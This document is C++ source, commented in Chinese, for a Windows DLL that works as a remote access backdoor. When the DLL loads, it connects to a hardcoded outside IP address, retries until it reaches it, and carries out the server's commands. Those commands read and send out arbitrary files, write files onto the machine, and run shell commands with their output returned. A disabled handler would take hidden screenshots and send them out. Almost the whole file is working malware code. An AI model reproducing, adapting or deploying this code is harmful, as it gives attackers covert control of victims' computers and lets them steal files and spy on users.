// Dll-generate.cpp : 定义 DLL 应用程序的导出函数。
// 在Visual Studio中创建DLL项目，使用此代码编译
//

#include "stdafx.h"
#include <vector>
#include <string>
#include <fstream>
#include <winsock2.h>
#include <windows.h>
#include <WS2tcpip.h>
#include <time.h>
#include <atlimage.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;


#ifdef _X86_
extern "C" {int _afxForceUSRDLL; }
#else
extern "C" { int __afxForceUSRDLL; }
#endif



/***** 功能函数表 *****/
void MakePath(string address, bool hidden); //创建文件夹目录
void SendBrief(SOCKET socket, string message); //使用socket发送信息
string ReadBrief(SOCKET socket); //使用套接字读取数据
void FetchFileHandler(SOCKET socket); //处理获取指定文件请求
void SendFileHandler(SOCKET socket);// 处理发送指定文件请求
void ShellHandler(SOCKET socket); //处理执行shell指令请求
void ScreenShotHandler(SOCKET socket); //处理截图指令请求


/***** DLL入口 *****/
BOOL APIENTRY DllMain(HANDLE hMoudle, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason) {
    case DLL_PROCESS_ATTACH: //进程调用，LoadLibrary或LoadLibraryEx时使用
    case DLL_THREAD_ATTACH: //线程调用，进程创建线程并在线程中调用?
    {   
        //服务器IP与端口
        string host = "47.106.20.56";
        //string host = "192.168.234.1";
        //string host = "127.0.0.1";
        unsigned int short port = 5547;

        SOCKET clientSocket;

        //初始化socket资源
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);

        //配置连接地址
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host.c_str());

        //创建socket
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);

        while (true)
        {
            //连接到服务器(失败则每隔10秒重新尝试)
            while (connect(clientSocket, (struct sockaddr *)&addr, sizeof(sockaddr)) == -1) { Sleep(10 * 1000); }

            try //捕获可能由服务端断开连接而导致的异常
            {
                //与服务器交互
                while (true)
                {
                    string line = ReadBrief(clientSocket);

                    if(line == "OK") //连接状态确认
                    {
                        SendBrief(clientSocket, "OK");
                    }
                    else if(line == "FETCHFILE") //获取指定文件
                    {
                        SendBrief(clientSocket, "OK");
                        FetchFileHandler(clientSocket);
                    }
                    else if (line == "SENDFILE")
                    {
                        SendBrief(clientSocket, "OK");
                        SendFileHandler(clientSocket);
                    }
                    else if(line == "SHELL") //执行SHELL指令
                    {
                        SendBrief(clientSocket, "OK");
                        ShellHandler(clientSocket);
                    }
                    //暂时废弃,先研究如何穿透Session0隔离
                    /* 
                    else if(line == "SCREENSHOT") //屏幕截图
                    {
                        SendBrief(clientSocket, "OK");
                        ScreenShotHandler(clientSocket);
                        MessageBoxA(NULL, "SCREENSHOT CLEAR", "OK", MB_OK);
                    }
                    */
                    else //鬼他妈知道是干啥
                    {
                        string wtf = "I acknowledged '" + line + "' but I decide to do nothing, fuck off!";
                        SendBrief(clientSocket, wtf);
                    }
                }
            }
            catch (...) //不管什么类型的异常, 重连就完事了
            {
                closesocket(clientSocket);
                clientSocket = socket(AF_INET, SOCK_STREAM, 0);
                continue;
            }
        }
    }
    case DLL_PROCESS_DETACH: //进程卸载，进程终止或调用FreeLibrary
    case DLL_THREAD_DETACH: //线程卸载，线程终止(ExitThread或线程返回)时触发，如果线程是由于TerminateThread终止则不会触发
        break;
    }
    return TRUE;
}


/***** 功能函数实现 *****/
/* 创建文件夹目录 */
void MakePath(string address, bool hidden)
{
    vector<string> dirs; //逐级保存文件夹路径
    int len = address.length();
    string temp = "";

    //由于CreateDirecotry只能自动创建一层目录，故路径不存在时需要逐级创建目录完成总路径的创建
    //逐级拆分目录
    for (int i = 0; i < len; i++)
    {
        if (address[i] == '\\' || address[i] == '/') //要进入下一级文件夹则保存本级文件夹的名称
        {
            dirs.push_back(temp);
            temp = "";
        }
        else //否则继续记录本级文件夹名称
        {
            temp += address[i];
        }
    }
    dirs.push_back(temp);

    //逐级调用CreateDirectory函数进行目录创建
    len = dirs.size();
    temp = dirs[0];
    for (int i = 1; i < len; i++)
    {
        temp += "\\" + dirs[i];
        CreateDirectoryA(temp.c_str(), NULL); //尝试创建当前级文件夹目录(目录存在的话不会重新创建并覆盖原文件)
        if (hidden) { SetFileAttributesA(temp.c_str(), FILE_ATTRIBUTE_HIDDEN); } //隐藏目录
    }
}

/* 使用套接字发送简短字符串 */
void SendBrief(SOCKET socket, string message)
{
    send(socket, message.c_str(), message.length(), 0);
}
/* 使用套接字接收简短字符串 */
string ReadBrief(SOCKET socket)
{
    char buffer[1024];
    int len = 0;
    len = recv(socket, buffer, 1024, 0);
    return string(buffer, len);
}

/* 处理获取指定文件请求 */
void FetchFileHandler(SOCKET socket)
{
    //获取文件路径
    string path = ReadBrief(socket);
    
    //检查文件是否存在，存在则返回大小
    FILE *fp = fopen(path.c_str(), "rb");
    if (fp == NULL) 
    {
        //返回错误
        SendBrief(socket, "ERROR");
        return;
    }
    else
    {
        //计算并发送文件大小
        long long fileSize = 0;
        fseek(fp, 0, SEEK_END);
        fileSize = _ftelli64(fp);
        fclose(fp);
        SendBrief(socket, to_string(fileSize));
    }

    //等待服务器回复(必须,否则会造成先前的信息与文件数据混淆)
    ReadBrief(socket);

    //开始发送文件
    fp = fopen(path.c_str(), "rb");
    char buffer[1024] = { 0 };  //文件缓冲区
    memset(&buffer, 0, 1024);
    int file_block_length = 0;
    while ((file_block_length = fread(buffer, sizeof(char), 1024, fp)) > 0)
    {
        if (send(socket, buffer, file_block_length, 0) < 0){ break; }
        memset(&buffer, 0, 1024);
    }
    fclose(fp);
}

/* 处理发送指定文件请求 */
void SendFileHandler(SOCKET socket)
{
    //接受文件大小
    string fileSize = ReadBrief(socket);
    long remainSize = stol(fileSize);
    SendBrief(socket, "OK");

    //读取文件夹路径和名称
    string filePath = ReadBrief(socket);
    SendBrief(socket, "OK");
    string fileName = ReadBrief(socket);

    //创建路径
    while (filePath[filePath.length() - 1] == '\\' || filePath[filePath.length() - 1] == '/')
    {
        filePath = filePath.substr(0, filePath.length() - 1);
    }
    MakePath(filePath, false);

    //打开目标文件
    string fullPath = filePath + "\\" + fileName;
    FILE * file = fopen(fullPath.c_str(), "wb");
    if (file == NULL) 
    {
        SendBrief(socket, "ERROR");
        return;
    }
    else
    {
        SendBrief(socket, "OK");
    }

    //下载文件到本地
    int recvLength = 0;
    char byteBuffer[MAXBYTE];
    while (remainSize > 0)
    {
        recvLength = recv(socket, byteBuffer, MAXBYTE, 0);
        fwrite(byteBuffer, recvLength, 1, file);
        remainSize -= recvLength;
    }
    fclose(file);
}

/* 处理执行shell指令请求 */
void ShellHandler(SOCKET socket)
{
    //读取输入的指令
    string cmd = ReadBrief(socket);

    //执行指令
    FILE * fpipe;
    if ((fpipe = (FILE*)_popen(cmd.c_str(), "r")) == 0)
    {
        SendBrief(socket, "ERROR");
        return;
    }
    string res;
    char c;
    while (fread(&c, sizeof(c), 1, fpipe)) { res += c; }

    //发送字符串长度
    SendBrief(socket, to_string(res.length()));

    //等待服务器回复(必须,否则会造成先前的信息与文件数据混淆)
    ReadBrief(socket);

    //发送字符串
    SendBrief(socket, res);
}

/* 处理截图指令请求 */
void ScreenShotHandler(SOCKET socket)
{
    //等待服务器回复(同步用，避免造成先前的信息与后续数据混淆)
    ReadBrief(socket);

    // 获取设备的窗口信息
    HDC hdcWindow = GetDC(NULL); // 要截图的窗口句柄，为空则全屏
    int xpos = 0;       // 起始x坐标
    int ypos = 0;       // 起始y坐标
    int width = GetDeviceCaps(hdcWindow, HORZRES);
    int height = GetDeviceCaps(hdcWindow, VERTRES);
    switch (GetDpiForWindow(GetDesktopWindow())) //根据屏幕缩放比例调整宽度和高度
    {
    case 96: //100% 
        width *= 1.0, height *= 1.0;
        break;
    case 120: //125%
        width *= 1.25; height *= 1.25;
        break;
    case 144: //150%
        width *= 1.5; height *= 1.5;
        break;
    case 192: //200%
        width *= 2.0; height *= 2.0;
        break;
    }

    // 获取设备相关信息的尺寸大小
    int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
    CImage image;
    // 创建图像，设置宽高，像素
    image.Create(width, height, nBitPerPixel);
    // 对指定的源设备环境区域中的像素进行位块（bit_block）转换
    BitBlt(
        image.GetDC(),  // 保存到的目标 图片对象 上下文
        xpos, ypos,     // 起始 x, y 坐标
        width, height,  // 截图宽高
        hdcWindow,      // 截取对象的 上下文句柄
        0, 0,           // 指定源矩形区域左上角的 X, y 逻辑坐标
        SRCCOPY);

    // 释放 DC句柄
    ReleaseDC(NULL, hdcWindow);
    // 释放图片上下文
    image.ReleaseDC();

    //根据时间生成临时文件名称
    time_t t = time(0);
    char tmp[64];
    strftime(tmp, sizeof(tmp), "%Y-%m-%d-%H-%M-%S", localtime(&t));
    string timeline(tmp);
    string fileName = "ScreenShot_" + timeline + ".jpg";
    string filePath = "C:\\" + fileName;

    //保存并隐藏文件
    image.Save(filePath.c_str());
    SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN);

    //打开截图,成功则返回大小
    FILE *fp = fopen(filePath.c_str(), "rb");
    if (fp == NULL)
    {
        //返回错误
        SendBrief(socket, "ERROR");
        //删除截图
        fclose(fp);
        remove(filePath.c_str());
        return;
    }
    else
    {
        //计算并发送文件大小
        long long fileSize = 0;
        fseek(fp, 0, SEEK_END);
        fileSize = _ftelli64(fp);
        fclose(fp);
        SendBrief(socket, to_string(fileSize));
    }

    //等待服务器回复(同步用，避免造成先前的信息与后续数据混淆)
    ReadBrief(socket);

    //发送文件名称
    SendBrief(socket, fileName);

    //等待服务器回复(同步用，避免造成先前的信息与后续数据混淆)
    ReadBrief(socket);

    //开始发送截图文件
    fp = fopen(filePath.c_str(), "rb");
    char buffer[1024] = { 0 };  //文件缓冲区
    memset(&buffer, 0, 1024);
    int file_block_length = 0;
    while ((file_block_length = fread(buffer, sizeof(char), 1024, fp)) > 0)
    {
        if (send(socket, buffer, file_block_length, 0) < 0) { break; }
        memset(&buffer, 0, 1024);
    }
    fclose(fp);
    //删除文件
    //remove(filePath.c_str());
}